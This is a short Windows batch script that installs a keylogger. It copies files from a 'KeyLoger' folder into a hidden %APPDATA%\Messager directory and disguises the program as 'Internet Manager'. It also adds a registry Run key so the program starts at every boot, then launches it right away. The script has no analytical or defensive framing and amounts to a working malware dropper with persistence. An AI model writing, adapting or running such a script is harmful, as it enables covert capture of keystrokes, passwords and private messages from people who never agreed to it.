@echo off

cd /d %~dp0KeyLoger
mkdir %APPDATA%\Messager

start /WAIT bin\counter.exe
move counter %APPDATA%\Messager\counter

copy key %APPDATA%\Messager\key
copy "Internet Manager.lnk" %APPDATA%\Messager

reg add "hklm\software\microsoft\windows\currentversion\run" /v "Internet Manager" /t reg_sz /d "%APPDATA%\Messager\Internet Manager.lnk" /f

xcopy /Y/C bin %APPDATA%\Messager\

start explorer "%APPDATA%\Messager\Internet Manager.lnk"